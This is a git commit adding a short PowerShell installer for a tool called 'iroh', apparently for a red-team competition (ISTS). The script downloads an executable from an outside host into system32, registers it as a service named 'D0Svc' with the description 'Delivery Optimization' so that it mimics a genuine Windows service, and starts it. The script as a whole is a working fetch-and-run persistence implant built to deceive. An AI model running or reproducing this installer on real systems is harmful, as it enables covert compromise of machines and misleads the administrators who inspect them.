fd8758028bd33b73cf52b26e2715df2f96949ab6
CrimsonMaple <crimsonkaede@gmail.com>
2021-03-06 00:17:49 -0500

    Create the installation script for iroh. (ISTS)

---
+++ install-iroh.ps1
@@ -0,0 +1,4 @@
+curl https://crimson.ninja/Iroh-Service.exe -o C:\Windows\system32\D0Svc.exe
+New-Service -Name "D0Svc" -BinaryPathName C:\Windows\system32\D0Svc.exe
+sc.exe description D0Svc "Delivery Optimization"
+Start-Service -Name "D0Svc"
